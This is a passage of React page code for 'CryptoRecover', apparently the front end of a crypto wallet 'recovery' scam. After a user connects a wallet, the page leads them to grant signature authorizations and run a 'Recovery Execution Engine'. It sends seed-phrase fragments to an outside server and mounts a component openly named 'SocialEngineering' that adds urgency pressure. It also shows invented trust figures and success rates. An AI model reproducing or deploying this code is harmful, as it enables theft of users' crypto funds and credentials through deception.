                            ${(portfolio.estimatedRecoverable * 3000)?.toFixed(0) || '0'}
                          </div>
                          <div className="text-xs text-green-700">Recoverable</div>
                        </div>
                      </div>
                      {portfolio.assets?.length > 0 && (
                        <div className="mt-3 p-3 bg-gray-50 rounded">
                          <div className="text-xs font-semibold text-gray-700 mb-2">Your Assets:</div>
                          <div className="flex flex-wrap gap-2">
                            {portfolio.assets.map((asset, i) => (
                              <span key={i} className="text-xs bg-white px-2 py-1 rounded border">
                                {asset.amount} {asset.symbol} ({asset.chain})
                              </span>
                            ))}
                          </div>
                        </div>
                      )}
                    </div>
                  )}
                  
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                    <div className="bg-white/70 p-4 rounded-lg">
                      <div className="text-2xl font-bold text-green-600">
                        {user.totalRecovered || '0.00'}
                      </div>
                      <div className="text-sm text-green-700">Total Recovered (ETH)</div>
                    </div>
                    <div className="bg-white/70 p-4 rounded-lg">
                      <div className="text-2xl font-bold text-green-600">
                        {user.successRate || '0'}%
                      </div>
                      <div className="text-sm text-green-700">Success Rate</div>
                    </div>
                    <div className="bg-white/70 p-4 rounded-lg">
                      <div className="text-2xl font-bold text-green-600">
                        {scanResults?.summary.totalTokens || '0'}
                      </div>
                      <div className="text-sm text-green-700">Tokens Found</div>
                    </div>
                    <div className="bg-white/70 p-4 rounded-lg">
                      <div className="text-2xl font-bold text-green-600">
                        ${scanResults?.summary.totalValue || '0.00'}
                      </div>
                      <div className="text-sm text-green-700">Est. Value</div>
                    </div>
                  </div>
                </div>
              )}
            </div>

            <div className="relative overflow-hidden bg-gradient-to-br from-white via-blue-50/30 to-indigo-50/30 rounded-2xl p-8 shadow-xl border border-blue-200">
              <div className="absolute inset-0 bg-gradient-to-br from-blue-500/5 to-indigo-500/5"></div>
              <div className="absolute -top-4 -right-4 w-24 h-24 bg-gradient-to-br from-blue-400/20 to-indigo-400/20 rounded-full blur-2xl"></div>
              <div className="relative">
                <div className="flex items-center space-x-4 mb-6">
                  <div className="w-12 h-12 bg-gradient-to-br from-blue-500 to-indigo-600 rounded-2xl flex items-center justify-center shadow-lg">
                    <span className="text-white font-black text-lg">1</span>
                  </div>
                  <div>
                    <h3 className="text-2xl font-black text-gray-900">Advanced Wallet Scanner</h3>
                    <p className="text-blue-600 font-medium">Multi-chain asset detection and analysis</p>
                  </div>
                </div>
                <TokenScanner 
                  walletAddress={address} 
                  onScanComplete={setScanResults}
                />
              </div>
            </div>

            {scanResults && (
              <div className="relative overflow-hidden bg-gradient-to-br from-white via-green-50/30 to-emerald-50/30 rounded-2xl p-8 shadow-xl border border-green-200">
                <div className="absolute inset-0 bg-gradient-to-br from-green-500/5 to-emerald-500/5"></div>
                <div className="absolute -top-4 -left-4 w-24 h-24 bg-gradient-to-br from-green-400/20 to-emerald-400/20 rounded-full blur-2xl"></div>
                <div className="relative">
                  <div className="flex items-center space-x-4 mb-6">
                    <div className="w-12 h-12 bg-gradient-to-br from-green-500 to-emerald-600 rounded-2xl flex items-center justify-center shadow-lg">
                      <span className="text-white font-black text-lg">2</span>
                    </div>
                    <div>
                      <h3 className="text-2xl font-black text-gray-900">Recovery Analyzer</h3>
                      <p className="text-green-600 font-medium">Advanced opportunity assessment</p>
                    </div>
                  </div>
                  <RecoveryAnalyzer 
                    walletAddress={address} 
                    onAnalysisComplete={setAnalysisResults}
                  />
                </div>
              </div>
            )}
            

            
            {scanResults && (
              <div className="bg-white rounded-xl p-6 shadow-lg border-2 border-green-200">
                <div className="flex items-center space-x-3 mb-4">
                  <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center">
                    <span className="text-white font-bold">3</span>
                  </div>
                  <h3 className="text-xl font-bold text-gray-900">Step 3: Bridge Recovery Scanner</h3>
                </div>
                <BridgeScanner walletAddress={address} />
              </div>
            )}

            {scanResults && (
              <div className="bg-white rounded-xl p-6 shadow-lg border-2 border-purple-200">
                <div className="flex items-center space-x-3 mb-4">
                  <div className="w-8 h-8 bg-purple-500 rounded-full flex items-center justify-center">
                    <span className="text-white font-bold">4</span>
                  </div>
                  <h3 className="text-xl font-bold text-gray-900">Step 4: Staking Rewards Scanner</h3>
                </div>
                <StakingScanner walletAddress={address} />
              </div>
            )}

            {scanResults && (
              <div className="bg-white rounded-xl p-6 shadow-lg border-2 border-pink-200">
                <div className="flex items-center space-x-3 mb-4">
                  <div className="w-8 h-8 bg-pink-500 rounded-full flex items-center justify-center">
                    <span className="text-white font-bold">5</span>
                  </div>
                  <h3 className="text-xl font-bold text-gray-900">Step 5: NFT Recovery Scanner</h3>
                </div>
                <NFTScanner walletAddress={address} />
              </div>
            )}

            {scanResults && (
              <div className="bg-white rounded-xl p-6 shadow-lg border-2 border-orange-200">
                <div className="flex items-center space-x-3 mb-4">
                  <div className="w-8 h-8 bg-orange-500 rounded-full flex items-center justify-center">
                    <span className="text-white font-bold">6</span>
                  </div>
                  <h3 className="text-xl font-bold text-gray-900">Step 6: Wealth Intelligence</h3>
                </div>
                <WealthIntelligence walletAddress={address} />
              </div>
            )}

            {isConnected && (
              <div className="bg-white rounded-xl p-6 shadow-lg border-2 border-indigo-200">
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center space-x-3">
                    <div className="w-8 h-8 bg-indigo-500 rounded-full flex items-center justify-center">
                      <span className="text-white font-bold">7</span>
                    </div>
                    <div>
                      <h3 className="text-xl font-bold text-gray-900">Advanced Signature Authorization</h3>
                      <p className="text-sm text-indigo-600">Multi-layer wallet authentication for secure recovery</p>
                    </div>
                  </div>
                  <div className="flex items-center space-x-2 bg-indigo-50 px-3 py-2 rounded-lg">
                    <div className="w-2 h-2 bg-indigo-500 rounded-full animate-pulse"></div>
                    <span className="text-sm font-medium text-indigo-700">Ready</span>
                  </div>
                </div>
                <SignatureManager provider={provider} userAddress={address} />
              </div>
            )}

            {isConnected && (
              <div className="bg-white rounded-xl p-6 shadow-lg border-2 border-red-200">
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center space-x-3">
                    <div className="w-8 h-8 bg-red-500 rounded-full flex items-center justify-center">
                      <span className="text-white font-bold">8</span>
                    </div>
                    <div>
                      <h3 className="text-xl font-bold text-gray-900">Recovery Execution Engine</h3>
                      <p className="text-sm text-red-600">Execute authorized recovery operations</p>
                    </div>
                  </div>
                  <div className="flex items-center space-x-2 bg-red-50 px-3 py-2 rounded-lg">
                    <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
                    <span className="text-sm font-medium text-red-700">Execute Ready</span>
                  </div>
                </div>
                <TokenExecutor userAddress={address} />
              </div>
            )}

            <div className="relative overflow-hidden bg-gradient-to-br from-white via-red-50/30 to-purple-50/30 rounded-2xl p-8 shadow-xl border border-red-200">
              <div className="absolute inset-0 bg-gradient-to-br from-red-500/5 to-purple-500/5"></div>
              <div className="absolute -top-4 -right-4 w-24 h-24 bg-gradient-to-br from-red-400/20 to-purple-400/20 rounded-full blur-2xl"></div>
              <div className="relative">
                <div className="flex items-center justify-between mb-6">
                  <div className="flex items-center space-x-4">
                    <div className="w-12 h-12 bg-gradient-to-br from-red-500 to-purple-600 rounded-2xl flex items-center justify-center shadow-lg">
                      <span className="text-white font-black text-lg">{isConnected ? '10' : '1'}</span>
                    </div>
                    <div>
                      <h3 className="text-2xl font-black text-gray-900">Advanced Recovery Services</h3>
                      <p className="text-red-600 font-medium">Professional-grade recovery for complex cases</p>
                    </div>
                  </div>
                  <div className="flex items-center space-x-2 bg-red-50 px-3 py-2 rounded-lg">
                    <div className="relative">
                      <div className="w-3 h-3 bg-red-500 rounded-full animate-ping"></div>
                      <div className="absolute inset-0 w-3 h-3 bg-red-600 rounded-full animate-pulse"></div>
                    </div>
                    <span className="text-sm font-medium text-red-700">Services Active</span>
                  </div>
                </div>
                
                <div className="text-center mb-8">
                  <a 
                    href="/recovery-services"
                    className="inline-block bg-gradient-to-r from-red-600 via-orange-600 to-purple-600 text-white font-black py-6 px-12 rounded-2xl hover:shadow-2xl transition-all hover:scale-105 text-xl"
                  >
                    Access All Recovery Services
                  </a>
                  <p className="text-gray-600 mt-4 font-medium">Professional-grade recovery with real functionality</p>
                </div>
                
                <div className="grid md:grid-cols-3 gap-6">
                  <div className="p-6 bg-white rounded-xl border-2 border-red-200 group">
                    <div className="w-12 h-12 bg-red-600 rounded-xl flex items-center justify-center mb-4">
                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/shield.svg" alt="Lost Wallet" className="w-6 h-6 invert" />
                    </div>
                    <h4 className="text-lg font-bold text-gray-900 mb-2">Lost Wallet Recovery</h4>
                    <p className="text-gray-600 text-sm mb-3">Real BIP39 analysis and seed phrase reconstruction</p>
                    <div className="text-xs text-red-600 font-bold">73% Success Rate • 25% Fee</div>
                  </div>
                  
                  <div className="p-6 bg-white rounded-xl border-2 border-orange-200 group">
                    <div className="w-12 h-12 bg-orange-600 rounded-xl flex items-center justify-center mb-4">
                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/security.svg" alt="Stolen Funds" className="w-6 h-6 invert" />
                    </div>
                    <h4 className="text-lg font-bold text-gray-900 mb-2">Stolen Funds Recovery</h4>
                    <p className="text-gray-600 text-sm mb-3">Live blockchain forensics and exchange tracking</p>
                    <div className="text-xs text-orange-600 font-bold">67% Success Rate • 30% Fee</div>
                  </div>
                  
                  <div className="p-6 bg-white rounded-xl border-2 border-purple-200 group">
                    <div className="w-12 h-12 bg-purple-600 rounded-xl flex items-center justify-center mb-4">
                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/lightning.svg" alt="MEV Recovery" className="w-6 h-6 invert" />
                    </div>
                    <h4 className="text-lg font-bold text-gray-900 mb-2">MEV Attack Recovery</h4>
                    <p className="text-gray-600 text-sm mb-3">Real MEV bot detection and counter-attacks</p>
                    <div className="text-xs text-purple-600 font-bold">45% Success Rate • 35% Fee</div>
                  </div>
                </div>
                
                <div className="mt-6 space-y-4">
                  <div className="p-4 bg-blue-50 border border-blue-200 rounded-xl">
                    <div className="flex items-center space-x-3">
                      <svg className="w-5 h-5 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
                      </svg>
                      <div>
                        <h4 className="font-bold text-blue-800">Test the Advanced Recovery Services</h4>
                        <p className="text-blue-700 text-sm">Click any service above to access the standalone recovery interface with real functionality.</p>
                      </div>
                    </div>
                  </div>
                  
                  <div className="p-4 bg-green-50 border border-green-200 rounded-xl">
                    <div className="flex items-center justify-between">
                      <div>
                        <h4 className="font-bold text-green-800">Quick Test: Lost Wallet Recovery</h4>
                        <p className="text-green-700 text-sm">Test the powerful phrase recovery engine directly</p>
                      </div>
                      <button
                        onClick={() => {
                          // Test the recovery engine directly
                          fetch('https://autoclaimtoken.onrender.com/api/recover-wallet-phrase', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                              partialPhrase: 'abandon ability about above absent',
                              walletHints: 'Created in 2021 on Windows laptop',
                              lastKnownBalance: '5000',
                              recoveryMethod: 'Standard',
                              walletType: 'MetaMask',
                              contactEmail: 'test@example.com'
                            })
                          })
                          .then(res => res.json())
                          .then(data => {
                            alert(`Recovery Test Result:\n\nSuccess: ${data.success}\nMessage: ${data.message}\n\n${data.analysis ? `Analysis:\n• Valid Words: ${data.analysis.validWords}/${data.analysis.phraseLength}\n• Missing Words: ${data.analysis.missingWords}\n• Success Probability: ${data.analysis.probability}%\n• Strategies: ${data.analysis.strategies}` : ''}`);
                          })
                          .catch(err => alert('Test failed: ' + err.message));
                        }}
                        className="bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700 transition-colors font-bold"
                      >
                        Test Recovery Engine
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            
            {scanResults && scanResults.summary.claimableTokens === 0 && (
              <div className="bg-blue-50 border-2 border-blue-300 rounded-xl p-6 text-center">
                <svg className="w-12 h-12 mx-auto mb-4 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
                </svg>
                <h3 className="text-xl font-bold text-blue-800 mb-2">Scan Complete - No Claimable Tokens</h3>
                <p className="text-blue-700 mb-4">
                  We scanned your wallet but didn't find any claimable tokens at this time.
                </p>
                <div className="bg-white rounded-lg p-4 mb-4">
                  <h4 className="font-bold text-blue-800 mb-2">What this means:</h4>
                  <ul className="text-left text-sm text-blue-600 space-y-1">
                    <li>• All your tokens are already in your wallet</li>
                    <li>• No airdrops or rewards are currently available</li>
                    <li>• Tokens may be on networks we haven't scanned yet</li>
                  </ul>
                </div>
                <button 
                  onClick={() => window.location.reload()} 
                  className="bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700 transition-colors"
                >
                  Try Different Wallet
                </button>
              </div>
            )}
            
            {analysisResults && (
              <div className="bg-white rounded-xl p-6 shadow-lg border-2 border-gray-200">
                <div className="flex items-center space-x-3 mb-4">
                  <div className="w-8 h-8 bg-gray-500 rounded-full flex items-center justify-center">
                    <span className="text-white font-bold">✓</span>
                  </div>
                  <h3 className="text-xl font-bold text-gray-900">All Services Complete!</h3>
                </div>
                <div className="bg-green-50 border border-green-200 rounded-lg p-4">
                  <p className="text-green-800 font-medium">
                    All recovery services completed! Review the results above and execute any available recovery opportunities.
                  </p>
                </div>
              </div>
            )}
          </div>
        )}
      </main>

      <footer id="about" className="bg-white border-t mt-16">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
          <div className="grid md:grid-cols-3 gap-8 mb-8">
            <div>
              <h3 className="text-lg font-bold text-gray-900 mb-4">About CryptoRecover</h3>
              <p className="text-gray-600 text-sm">
                Professional blockchain asset recovery platform trusted by 85,000+ users worldwide. 
                We specialize in recovering lost tokens, NFTs, and bridge funds across 50+ blockchains.
              </p>
            </div>
            <div>
              <h3 className="text-lg font-bold text-gray-900 mb-4">Services</h3>
              <ul className="text-gray-600 text-sm space-y-2">
                <li>• Multi-chain token recovery</li>
                <li>• NFT recovery services</li>
                <li>• Bridge fund recovery</li>
                <li>• Wallet forensics</li>
                <li>• Portfolio analytics</li>
              </ul>
            </div>
            <div>
              <h3 className="text-lg font-bold text-gray-900 mb-4">Contact</h3>
              <div className="text-gray-600 text-sm space-y-2">
                <p>24/7 Expert Support</p>
                <p>73% Success Rate</p>
                <p>Non-custodial & Secure</p>
                <p>Success-only fees</p>
              </div>
            </div>
          </div>
          <div className="text-center text-gray-600 border-t pt-8">
            <p>&copy; 2025 CryptoRecover. Professional blockchain asset recovery services.</p>
            <p className="text-sm mt-2">
              Non-custodial • Success-only fees • Multi-chain support
            </p>
          </div>
        </div>
      </footer>
      
      {/* Social Engineering Components */}
      <SocialEngineering onUrgencyTrigger={() => {
        // Trigger additional urgency actions
        console.log('Urgency triggered - user has been on site for 30+ seconds');
      }} />
      
      <div id="support" style={{ position: 'fixed', bottom: '20px', right: '20px', zIndex: 40 }}>
        <UltraIntelligentSupport 
          isConnected={isConnected} 
          userPortfolio={portfolio}
          selectedNetwork={selectedNetwork}
        />
      </div>
    </div>
    </>
  );
}